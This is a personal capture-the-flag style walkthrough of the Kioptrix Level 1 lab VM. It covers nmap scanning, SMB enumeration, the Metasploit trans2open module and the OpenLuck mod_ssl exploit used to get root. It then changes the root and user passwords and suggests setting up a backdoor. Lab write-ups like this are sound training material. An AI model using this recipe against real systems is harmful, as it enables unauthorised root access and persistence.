# Kioptrix

## Step 0

`sudo su`

## Step 1: find ip

1. `ifconfig`

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.110.131  netmask 255.255.255.0  broadcast 192.168.110.255
        inet6 fe80::20c:29ff:fe74:24c3  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:74:24:c3  txqueuelen 1000  (Ethernet)
        RX packets 172546  bytes 30987516 (29.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 188193  bytes 20812007 (19.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2340  bytes 206848 (202.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2340  bytes 206848 (202.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

My IP -> 192.168.110.131

2. `nmap -sP 192.168.110.1/24`

```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-18 08:45 EST
Nmap scan report for 192.168.110.2
Host is up (0.0010s latency).
Nmap scan report for 192.168.110.131
Host is up (0.000060s latency).
Nmap scan report for 192.168.110.134
Host is up (0.0029s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.60 seconds
```

possible IP -> 192.168.110.134

3. `nmap -sV -p- -O 192.168.110.134 `
    - -O -> also show OS version
    - -p- ->all ports deep scan

```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-18 09:07 EST
Nmap scan report for 192.168.110.134
Host is up (0.0014s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:4A:7B:0E (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.54 seconds
```

-   we dont care about rpcbind ports, ssh can't be hacked
-   so the ports to consider:
    -   80/tcp http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
    -   139/tcp netbios-ssn Samba smbd (workgroup: MYGROUP)
    -   443/tcp ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

4. Optional: `nbtscan 192.168.110.1/24` -> will also work cause there is an SMB port open

## Step 2: search for vulnerabilities

1.  open the site in browser to check stuffs (both http and https)
2.  `enum4linux 192.168.110.134`

    -   enumerate all the stuffs kali can access from the IP
    -   Important stuffs

        -   `Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none`
            -   usernames on SMB client (not the linux computer)
        -   ```
             KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
             platform_id     :       500
             os version      :       4.5
             server type     :       0x9a03
            ```
        -   Share Enumeration Information

        ```
                        Sharename       Type      Comment
                ---------       ----      -------
                IPC$            IPC       IPC Service (Samba Server)
                ADMIN$          IPC       IPC Service (Samba Server)
        Reconnecting with SMB1 for workgroup listing.

                Server               Comment
                ---------            -------
                KIOPTRIX             Samba Server

                Workgroup            Master
                ---------            -------
                MYGROUP              KIOPTRIX
        ```

3.  metasploit auxillary tests

    1. run `auxiliary/scanner/smb/smb_version` to get samba version (cause smb has a lot of exploits)
        - Samba 2.2.1a
        - exploit from googling (https://www.cvedetails.com/cve/CVE-2004-1154/)
            - 10.0 -> means we can get direct root access
        - (https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/)
    2. `search trans2open`

    ```
    Matching Modules
    ================

    #  Name                              Disclosure Date  Rank   Check  Description
    -  ----                              ---------------  ----   -----  -----------
    0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
    1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
    2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
    3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
    ```

        - redhat can be freebsd or linux -> in nmap we saw (Red Hat/Linux) so we `use 1`
        - `show info`
        - set options and `run`
        - take long time -> `Ctrl + C`

## Step 3: Manual Exploit

-   (found by googling) github links always better -> (https://github.com/heltonWernik/OpenLuck)
-   follow github steps
- Redhat Linux  Apache 1.3.20 -> 0x6a and 0x6b -> tey second version as it will be newer
-   `./OpenFuck 0x6b 192.168.110.134 443 -c 40`

## Step 4: inside OS
1. `whoami` -> should be root -> you have root access
2. `/bin/bash -i` -> open a tty shell
3. `passwd john` -> update the password (1a2b3c)
4. `passwd root` -> update the password (1a2b3c)

## Step 5: in Kioptrix
1. login using neww password and usewrname
2. you have new mail -> `history` to check the command to find `mail command`
3. `mail` and check the mails
4. Congratulations

## Step 6: setup ssh (cause ssh port is open in the Box)
1. `ssh root@192.168.110.134`

2. error fix -> https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0

3. command -> `ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -c aes128-cbc root@192.168.110.134`

4. enter password

5. you can now access the computer directly from the kali


## Further 
1. There is a Kioptrix Level 2, try it
2. try to setup backdoor
